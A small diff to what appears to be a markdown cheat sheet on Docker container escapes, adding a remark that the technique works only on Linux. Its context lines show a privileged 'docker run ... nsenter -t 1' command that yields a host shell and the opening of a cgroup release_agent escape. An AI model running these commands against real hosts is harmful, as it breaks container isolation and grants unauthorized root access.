@@ -54,6 +54,8 @@ docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
 ## Escape the container
+This will only work on Linux.  It doesn't work on Docker for Desktop.
+
 [understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)  
 ```
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
